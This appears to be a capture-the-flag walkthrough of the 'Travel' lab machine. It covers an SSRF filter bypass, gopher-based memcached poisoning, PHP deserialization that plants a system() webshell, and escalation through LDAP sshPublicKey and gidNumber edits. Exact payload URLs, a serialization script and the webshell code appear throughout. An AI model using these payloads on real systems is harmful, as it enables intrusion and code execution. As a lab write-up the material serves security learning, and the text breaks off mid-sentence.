Synopsis

Travel is a hard difficulty Linux machine that features a WordPress instance along with a
development server. The server is found to host an exposed Git repository, which reveals
sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization
vulnerability are identified. These are leveraged to gain code execution. A backup password is
cracked and used to move laterally. The user is found to be an LDAP administrator and can edit
user attributes. This is leveraged to modify group membership and gain root privileges.

      PHP Code Review
      LDAP

Skills Learned

We find the url_get_contents function defined here. It uses the safe method to check if the
URL is valid or not. If valid, curl is used to request the resource and return its contents.

The filter blocks the file:// URI scheme, however we can still use various other protocols such
as gopher . We also see it blocking access to localhost and 127.0.0.1 . However, this can be
easily bypassed by converting the IP address to its decimal notation. This will let us perform
Server Side Request Forgery (SSRF) attacks and communicate with internally hosted resources.

The script also contains a class named TemplateHelper .

   class TemplateHelper
   {

          private $file;
          private $data;

          public function __construct(string $file, string $data)
          {

                 $this->init($file, $data);
          }

          public function __wakeup()
          {

                 $this->init($this->file, $this->data);
          }

          private function init(string $file, string $data)
          {

                 $this->file = $file;
                 $this->data = $data;
                 file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);

   }

The init() method uses the file_put_contents() function to write data to a log file. This is
method is called from the __construct and __wakeup functions. These are known as magic
methods in PHP, which are invoke when certain actions are taken. For example, the __wakeup
method is called when an object of that class is deserialized. Let's keep this in mind and move on.

SSRF

The source code revealed that a memcached server is being used to cache the feeds.

   memcache://127.0.0.1:11211/?timeout=60&prefix=xct_
Memcached is used to cache objects in memory, so that they can be retrieved quickly, without
making multiple requests. For example, data retrieved from a DBMS can be cached to avoid
issuing SQL queries each time. It stores data in the form of key-value pairs. The URL above states
that the keys should be prefixed with xct_ .
Let's look at the debugging output to see if this is true. Browse to
http://blog.travel.htb/awesome-rss to cache the feed and then go to
http://blog.travel.htb/awesome-rss/?debug to enable the debug flag. Inspection of the page
source reveals the following:

As expected, we see the key prefixed with xct and its value to set to a PHP serialized object. This
must be the data cached by SimplePie. It's also possible that this data is later deserialized, which
makes it a potential vector for exploiting unsafe deserialization.
In order to do that, we'll have to inject a malicious payload into the cache. This can be done via
the SSRF vector discovered earlier. First, let's test if the page is vulnerable. We can set the
custom_feed_url parameter to fetch the feed from our server.

   http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.4/test
Start an HTTP server and request the URL above.

The feed returns empty, but the HTTP server receives requests.

This confirms the SSRF vulnerability. Next, we need to find a way to poison the memcached keys.
This can be done with the help from the gopher protocol.
Gopher is one of the oldest protocols used to access resources over a network. The modern
HTTP protocol is an evolved form of Gopher. The gopher protocol is supported by various
browsers as well as cURL. Unlike HTTP, Gopher can be used to craft requests and communicate
with various kinds of services.

   gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:test.com%0A%0A
For example, the request above will be interpreted by the server as:

   GET / HTTP/1.1
   Host: test.com
Where %20 represents spaces and %0A stands for new lines. This can also be used to
communicate with other services using plaintext protocols such as memcached.
The Gopherus tool can be used to craft such payloads automatically.
   git clone https://github.com/tarunkant/Gopherus
   cd Gopherus
   bash install.sh
We can specify the phpmemcache option to generate PHP serialized objects.

For testing purposes, we'll set the payload to test . The generated payload can be interpreted as
follows:

   set SpyD3r 4 0 4
   test
This creates a key named SpyD3r in memcached with the value test . Request the following URL
in the browser to test this out, where 2130706433 is the decimal notation for 127.0.0.1 .
   http://blog.travel.htb/awesome-rss/?
   custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0at
   est%0d%0a

Deserialization

Now that we can inject values in memcached, let's try to leverage this. We already know that
memcached stores serialized PHP objects. This can be exploited by injecting a malicious object
and triggering it via an unserialize() call. The code itself doesn't seem to have any
unserialize() calls, but it's possible that this is used within the SimplePie plugin.
The SimplePie Memcached class can be found on GitHub. Firstly, we see the following
__construct method from the SimplePie_Cache_Memcached class, which generates the key
name.

The specified prefix is prepended to the MD5 hash of the string formed by concatenating
$name and $type . These values are passed as arguments to the methods.
Looking at the Cache.php source code, we see the following get_handler() function.
This function returns an object based on the type of handler requested.

We see that one of the handlers is SimplePie_Cache_Memcached . This means the $name variable
within the constructor is set to $filename , while $type is set to $extension .
Looking for usage of this method, we come across class-simplepie.php.

   $cache = $this->registry->call('Cache', 'get_handler', array($this-
   >cache_location, call_user_func($this->cache_name_function, $url), 'spc'));
This script calls the get_handler method with the parameters cache_location ($location),
cache_name_function($url) ($filename) and spc ($extension). On searching for
cache_name_function in the same script, we see that it is set to MD5.
This means that $filename is set to md5($url) , while $extension is set to spc . This provides us
with sufficient information to calculate the key name:

   keyname = md5(md5(url) + ":" + "spc")
Let's verify this using the original URL used by the server.

   echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
   echo -n '3903a76d1e6fef0d76e973a0561cbfc0:spc' | md5sum

Comparing with the debug output, we see that the first 10 characters of the key name does
match our calculated hash.

Returning to the SimplePie_Cache_Memcached class, we also see a load() method that calls
unserialize() .

We also need to find a class to craft a malicious object for. This is where the TemplateHelper
class comes in. We can create a malicious object of this class and write a PHP file to the logs
folder when it's unserialized. Use the following script to generate such an object. Note that the
$file and $data variable should be made public as private variables can't be accessed directly
while deserializing.

   <?php
   class TemplateHelper
   {

          public $file;
          public $data;

          public function __construct(string $file, string $data)
          {

                 $this->init($file, $data);
          }

          private function init(string $file, string $data)
          {

                 $this->file = $file;
                 $this->data = $data;
                 file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
          }
   }

   $pwn = new TemplateHelper("shell.php", "<?php system(\$_GET[0]); ?>");
   echo serialize($pwn);
   ?>

The script above serializes an object of the class TemplateHelper , which writes a webshell to
shell.php on deserialization.

The user's home folder is found to contain a .ldaprc file. According to the documentation, this
file is used to set configuration variables before connecting to LDAP (Lightweight Directory Access
Protocol).

   HOST ldap.travel.htb
   BASE dc=travel,dc=htb
   BINDDN cn=lynik-admin,dc=travel,dc=htb
The server appears to be at 172.20.0.10 .

The default LDAP port 389 can to exposed to our machine using SSH.
   ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189

This will let us access the server from localhost. Let's attempt to query the LDAP service.
   ldapsearch -x -h 127.0.0.1 -b "DC=travel,DC=htb" -D "CN=lynik-
   admin,DC=travel,DC=htb"

The -x option specifies simple anonymous authentication. The -b flag is used to specify the
search base, while the -D flag specifies the bind DN. These values are taken from the .ldaprc
file.

the lynik-admin account password doesn't work either.

Inspecting the SSH configuration reveals an interesting setting.

   Include /etc/ssh/sshd_config.d/*.conf
   AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
   AuthorizedKeysCommandUser nobody
   ChallengeResponseAuthentication no
   UsePAM yes

According to the sshd_config manpage, the AuthorizedKeysCommand configuration is used to
specify the program from which the SSH server retrieves user public keys from.

The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain.
According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in
LDAP.
Let's try adding this public key attribute to the lynik user. First, add a new attribute of type
objectClass , then select ldapPublicKey from the list and click on finish.

Next, add the attribute sshPublicKey and then click Finish . Click on Edit as Text in the
editor and paste the public key.

This should save our public key, allowing us to SSH in with our private key.
This time the login was successful. However, all users present in the LDAP tree are low privileged
domain users, which seemingly provide no advantage. Checking back on the LDAP attributes, we
see an attribute gidNumber . Its value matches the GID of the user on the box.

Let's try changing the GID to 27 (sudo group) and see if we can escalate to root.

Logout of the SSH session and login again, in order to apply to group membership change to our
